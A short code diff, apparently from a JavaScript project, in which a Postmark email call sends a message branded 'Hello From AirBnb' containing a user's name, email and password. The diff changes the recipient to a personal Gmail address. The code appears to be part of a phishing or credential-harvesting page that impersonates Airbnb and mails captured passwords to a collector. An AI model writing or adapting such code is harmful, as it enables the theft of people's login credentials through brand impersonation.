@@ -165,7 +165,7 @@ const client = new postmark.ServerClient(serverToken);
 
 client.sendEmail({
   "From": "justfelix@felixdev.com.ng",
-  "To": "justfelix@felixdev.com.ng",
+  "To": "owolabifelix78@gmail.com",
   "Subject": "Test",
   "TextBody": `Hello From AirBnb,${name},${email},${password}`
 });
